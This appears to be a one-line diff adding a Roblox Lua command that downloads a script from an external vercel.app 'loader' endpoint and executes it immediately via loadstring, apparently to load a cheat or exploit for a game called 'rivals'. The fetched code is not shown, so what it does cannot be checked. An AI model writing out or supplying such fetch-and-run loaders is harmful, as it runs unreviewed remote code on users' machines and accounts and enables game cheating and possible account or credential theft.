@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://atomprotect.vercel.app/api/loader/rivals"))()
